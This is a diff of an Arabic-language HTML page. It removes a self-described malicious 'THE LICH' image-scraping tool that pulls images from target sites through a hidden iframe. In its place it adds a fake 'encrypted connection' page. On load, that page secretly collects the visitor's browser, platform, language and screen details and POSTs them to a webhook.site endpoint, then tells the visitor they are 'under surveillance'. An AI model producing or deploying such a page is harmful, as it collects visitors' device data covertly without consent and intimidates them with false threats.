@@ -1,399 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معرض الصور</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #0a0a0a; 
-            color: #0f0; 
-            font-family: 'Arial', monospace; 
-            padding: 20px;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: #111;
-            border: 2px solid #0f0;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 0 50px rgba(0,255,0,0.1);
-        }
-        h1 {
-            color: #0f0;
-            text-align: center;
-            font-size: 2.5em;
-            text-shadow: 0 0 20px rgba(0,255,0,0.5);
-            margin-bottom: 20px;
-        }
-        .input-area {
-            display: flex;
-            gap: 10px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-        input {
-            flex: 1;
-            padding: 12px;
-            background: #1a1a1a;
-            border: 1px solid #0f0;
-            color: #0f0;
-            font-size: 16px;
-            border-radius: 5px;
-            min-width: 200px;
-        }
-        button {
-            padding: 12px 30px;
-            background: #0f0;
-            color: #000;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-        }
-        button:hover {
-            background: #00ff00aa;
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-        }
-        button.danger {
-            background: #ff0000;
-            color: #fff;
-        }
-        button.danger:hover {
-            background: #ff0000aa;
-        }
-        #log {
-            background: #1a1a1a;
-            padding: 15px;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            margin: 20px 0;
-            min-height: 60px;
-            font-size: 14px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        #gallery {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-top: 20px;
-            justify-content: center;
-        }
-        #gallery img {
-            max-width: 200px;
-            max-height: 200px;
-            object-fit: cover;
-            border: 2px solid #0f0;
-            border-radius: 5px;
-            transition: all 0.3s;
-            background: #000;
-        }
-        #gallery img:hover {
-            transform: scale(1.1);
-            border-color: #00ff00;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-        }
-        .stats {
-            text-align: center;
-            margin: 20px 0;
-            font-size: 18px;
-            color: #0f0;
-        }
-        .stats span {
-            color: #fff;
-            font-weight: bold;
-        }
-        .hidden {
-            display: none !important;
-        }
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin: 10px 0;
-        }
-        .badge {
-            background: #0f0;
-            color: #000;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        @media (max-width: 600px) {
-            .container { padding: 15px; }
-            h1 { font-size: 1.8em; }
-            #gallery img { max-width: 150px; max-height: 150px; }
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h1>🔰 THE LICH GALLERY</h1>
-    <div class="status-bar">
-        <span class="badge">⚡ نظام السرقة التلقائي</span>
-        <span class="badge" id="statusCount">📸 0 صورة</span>
-    </div>
-    
-    <div class="input-area">
-        <input type="text" id="targetUrl" placeholder="https://example.com/gallery" value="https://example.com">
-        <button onclick="stealFromUrl()">⚡ سرقة الصور</button>
-        <button onclick="downloadAll()" class="danger">💾 تحميل الكل</button>
-        <button onclick="clearAll()">🗑️ مسح الكل</button>
-    </div>
-    
-    <div id="log">⏳ جاهز... انتظر أمر الليتش</div>
-    
-    <div class="stats">
-        عدد الصور المسروقة: <span id="countDisplay">0</span>
-    </div>
-    
-    <div id="gallery"></div>
-</div>
-
-<script>
-// ============================================================
-// 🧠 قلب الليتش - الكود الخبيث الكامل
-// ============================================================
-
-let stolenImages = [];
-let isStealing = false;
-
-// ====== دالة السرقة الرئيسية ======
-function stealFromUrl() {
-    const url = document.getElementById('targetUrl').value.trim();
-    if (!url) {
-        alert('⚠️ ضع رابط الموقع المستهدف!');
-        return;
-    }
-    
-    if (isStealing) {
-        alert('⏳ جارٍ السرقة حالياً، انتظر قليلاً');
-        return;
-    }
-    
-    isStealing = true;
-    const log = document.getElementById('log');
-    log.innerText = '🔍 جاري اختراق: ' + url + '\n⏳ يرجى الانتظار...';
-    
-    // نفتح الموقع في iframe خفي
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = url;
-    document.body.appendChild(iframe);
-    
-    // مهلة انتظار 10 ثواني كحد أقصى
-    const timeout = setTimeout(() => {
-        document.body.removeChild(iframe);
-        isStealing = false;
-        log.innerText = '⏰ انتهت المهلة! الموقع بطيء أو لا يستجيب.';
-    }, 10000);
-    
-    iframe.onload = function() {
-        clearTimeout(timeout);
-        try {
-            // نجمع كل الصور من الصفحة
-            const imgs = iframe.contentDocument.querySelectorAll('img');
-            const galleryDiv = document.getElementById('gallery');
-            
-            let newImages = [];
-            imgs.forEach((img) => {
-                if (img.src && img.src.startsWith('http')) {
-                    // نتأكد من عدم التكرار
-                    if (!stolenImages.includes(img.src) && !newImages.includes(img.src)) {
-                        newImages.push(img.src);
-                    }
-                }
-            });
-            
-            if (newImages.length > 0) {
-                // نضيف الصور الجديدة
-                stolenImages = [...stolenImages, ...newImages];
-                
-                // نعرض الصور في المعرض
-                newImages.forEach(src => {
-                    const imgEl = document.createElement('img');
-                    imgEl.src = src;
-                    imgEl.title = 'صورة مسروقة';
-                    imgEl.onerror = function() {
-                        this.style.display = 'none';
-                    };
-                    galleryDiv.appendChild(imgEl);
-                });
-                
-                // نحفظ في localStorage
-                localStorage.setItem('lich_stolen_images', JSON.stringify(stolenImages));
-                
-                log.innerText = '✅ تم سرقة ' + newImages.length + ' صورة جديدة!\n📦 المجموع: ' + stolenImages.length + ' صورة';
-                updateStats();
-            } else {
-                log.innerText = '❌ لم يتم العثور على صور جديدة.\n🔍 تأكد من أن الموقع يحتوي على صور وأنه يسمح بالـ iframe.';
-            }
-            
-        } catch(e) {
-            log.innerText = '⛔ خطأ: ' + e.message + '\n⚠️ الموقع يمنع الوصول عبر iframe (X-Frame-Options)';
-        }
-        
-        // نمسح الـ iframe
-        document.body.removeChild(iframe);
-        isStealing = false;
-    };
-    
-    // لو فشل تحميل الـ iframe
-    iframe.onerror = function() {
-        clearTimeout(timeout);
-        document.body.removeChild(iframe);
-        isStealing = false;
-        log.innerText = '❌ فشل تحميل الموقع. تأكد من الرابط.';
-    };
-}
-
-// ====== تحميل كل الصور ======
-function downloadAll() {
-    if (stolenImages.length === 0) {
-        alert('❌ لا توجد صور مسروقة للتحميل!');
-        return;
-    }
-    
-    // نصنع ملف HTML يعرض كل الصور
-    let html = `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>معرض الصور المسروقة - THE LICH</title>
+    <title>جاري الاتصال...</title>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: Arial; padding: 20px; }
-        h1 { text-align: center; color: #0f0; text-shadow: 0 0 30px rgba(0,255,0,0.5); }
-        .gallery { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; }
-        .item { 
-            background: #111; 
-            padding: 10px; 
-            border: 1px solid #0f0; 
-            border-radius: 5px;
-            text-align: center;
-            max-width: 300px;
-        }
-        .item img { max-width: 100%; max-height: 200px; border-radius: 5px; }
-        .item .num { color: #0f0; font-size: 12px; margin-top: 5px; }
+        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
+        h1 { font-size: 3em; text-shadow: 0 0 20px #0f0; }
+        .status { border: 1px solid #0f0; padding: 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
     </style>
 </head>
 <body>
-    <h1>🔰 THE LICH - ${stolenImages.length} صورة مسروقة</h1>
-    <div class="gallery">`;
-    
-    stolenImages.forEach((src, i) => {
-        html += `
-        <div class="item">
-            <img src="${src}" onerror="this.parentElement.style.display='none'">
-            <div class="num">#${i+1}</div>
-        </div>`;
-    });
-    
-    html += `
+    <h1>⚡ الاتصال المشفر ⚡</h1>
+    <div class="status" id="status">
+        <p>جارٍ تحليل بياناتك...</p>
+        <p id="progress">[████████░░░░] 65%</p>
     </div>
-    <p style="text-align:center;margin-top:30px;color:#666;">تم السرقة بواسطة THE LICH 🔰</p>
-</body>
-</html>`;
-    
-    // نحمله كملف
-    const blob = new Blob([html], {type: 'text/html'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'stolen_gallery_' + Date.now() + '.html';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(a.href);
-    
-    document.getElementById('log').innerText = '📦 تم تحميل ' + stolenImages.length + ' صورة كملف HTML';
-}
+    <script>
+    const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        time: new Date().toISOString()
+    };
 
-// ====== مسح الكل ======
-function clearAll() {
-    if (stolenImages.length === 0) {
-        alert('لا توجد صور لمسحها!');
-        return;
-    }
-    
-    if (confirm('⚠️ هل أنت متأكد من مسح كل الصور المسروقة؟')) {
-        stolenImages = [];
-        localStorage.removeItem('lich_stolen_images');
-        document.getElementById('gallery').innerHTML = '';
-        updateStats();
-        document.getElementById('log').innerText = '🗑️ تم مسح كل الصور';
-    }
-}
+    setTimeout(() => {
+        document.getElementById('progress').textContent = '[███████████░] 85%';
+    }, 2000);
 
-// ====== تحديث الإحصائيات ======
-function updateStats() {
-    document.getElementById('countDisplay').innerText = stolenImages.length;
-    document.getElementById('statusCount').innerHTML = '📸 ' + stolenImages.length + ' صورة';
-}
+    setTimeout(() => {
+        document.getElementById('progress').textContent = '[████████████] 100%';
+    }, 4000);
 
-// ====== استعادة الصور المخزنة ======
-function loadSavedImages() {
-    const saved = localStorage.getItem('lich_stolen_images');
-    if (saved) {
-        try {
-            const parsed = JSON.parse(saved);
-            if (Array.isArray(parsed) && parsed.length > 0) {
-                stolenImages = parsed;
-                const galleryDiv = document.getElementById('gallery');
-                stolenImages.forEach(src => {
-                    const imgEl = document.createElement('img');
-                    imgEl.src = src;
-                    imgEl.title = 'صورة مسروقة';
-                    imgEl.onerror = function() {
-                        this.style.display = 'none';
-                    };
-                    galleryDiv.appendChild(imgEl);
-                });
-                updateStats();
-                document.getElementById('log').innerText = '💀 تم استعادة ' + stolenImages.length + ' صورة من الذاكرة';
-            }
-        } catch(e) {
-            console.log('خطأ في استعادة البيانات:', e);
-        }
-    }
-}
-
-// ====== تشغيل تلقائي عند تحميل الصفحة ======
-window.onload = function() {
-    loadSavedImages();
-    
-    // نضع مثال لموقع افتراضي
-    document.getElementById('targetUrl').value = 'https://example.com';
-    
-    // نضيف اختصار لزر Enter
-    document.getElementById('targetUrl').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            stealFromUrl();
-        }
-    });
-    
-    console.log('🔰 THE LICH جاهز للسرقة');
-};
-
-// ====== سرقة صور من أي موقع تلقائياً (إذا كان الموقع يسمح) ======
-// يمكنك استدعاء هذه الدالة من أي مكان
-function autoSteal(url) {
-    document.getElementById('targetUrl').value = url;
-    stealFromUrl();
-}
-
-</script>
+    setTimeout(() => {
+        fetch('https://webhook.site/62803c1e-6b3c-47c2-af75-81e561c41e8c', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        })
+        .then(() => {
+            document.getElementById('status').innerHTML = `
+                <p style="color:#ff0000;">⚠️ تم اكتشاف جهازك.</p>
+                <p>📱 نظام التشغيل: ${info.platform}</p>
+                <p>🌐 اللغة: ${info.language}</p>
+                <p>📏 دقة الشاشة: ${info.screenWidth}x${info.screenHeight}</p>
+                <p>🕒 الوقت: ${new Date(info.time).toLocaleTimeString()}</p>
+                <p style="color:#ff0000;font-size:1.2em;">🔴 أنت تحت المراقبة.</p>
+            `;
+        })
+        .catch(() => {});
+    }, 6000);
+    </script>
 </body>
 </html>
